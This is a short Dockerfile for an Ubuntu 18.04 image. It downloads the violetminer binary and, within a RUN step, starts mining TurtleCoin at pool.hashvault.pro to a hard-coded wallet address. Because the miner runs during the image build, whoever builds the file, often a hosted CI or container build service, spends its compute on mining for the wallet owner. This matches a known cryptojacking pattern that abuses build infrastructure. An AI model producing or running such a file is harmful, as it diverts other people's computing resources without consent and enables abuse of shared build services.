FROM ubuntu:18.04

ENV DEBIAN_FRONTEND=noninteractive

#RUN echo 'deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n' > /etc/apt/sources.list

RUN apt-get upgrade
RUN set -ex; \
    apt-get update \
    && apt-get install -y \
            wget
RUN wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
RUN tar xf violetminer-linux-v0.2.2.tar.gz
RUN ./violetminer-linux-v0.2.2/violetminer --pool pool.hashvault.pro:80 --username TRTLv36c687DUYisiyzycpB2vUwUWZq3AJ4i8c7x5ssLVSYa6Eud9QZShHmSMGFGW2fvn1XCg5HY2hB1w3un35GB2K7r8i8Kxcr --password x --algorithm chukwa_v2 --ssl
